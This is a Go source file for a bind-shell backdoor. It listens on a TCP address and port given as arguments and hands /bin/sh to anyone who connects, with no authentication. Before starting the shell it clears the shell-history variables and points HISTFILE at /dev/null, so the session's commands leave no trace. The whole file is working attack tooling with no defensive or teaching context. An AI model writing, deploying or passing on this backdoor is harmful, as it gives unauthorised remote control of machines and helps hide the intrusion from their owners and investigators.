package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"path"
	"syscall"
)

var (
	ip    string
	port  string
	addr  string
	conn  net.Conn
	shell = "/bin/sh"
	way   = "tcp"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Printf("Usage: %s [ip] [port]\n", path.Base(os.Args[0]))
		os.Exit(0)
	}

	ip = os.Args[1]
	port = os.Args[2]
	addr = fmt.Sprintf("%s:%s", ip, port)

	listener, err := net.Listen("tcp", addr)
	checkError(err)
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		fmt.Println(conn.RemoteAddr().String())
		checkError(err)
		go func() {
			cmd := exec.Command(shell)
			syscall.Unsetenv("HISTFILE")
			syscall.Unsetenv("HISTFILESIZE")
			syscall.Unsetenv("HISTSIZE")
			syscall.Unsetenv("HISTORY")
			syscall.Unsetenv("HISTSAVE")
			syscall.Unsetenv("HISTZONE")
			syscall.Unsetenv("HISTLOG")
			syscall.Unsetenv("HISTCMD")
			syscall.Setenv("HISTFILE", "/dev/null")
			syscall.Setenv("HISTSIZE", "0")
			syscall.Setenv("HISTFILESIZE", "0")
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn
			cmd.Run()
			conn.Close()
		}()
	}

}

func checkError(err error) {
	if err != nil {
		fmt.Println(err.Error())
	}
}
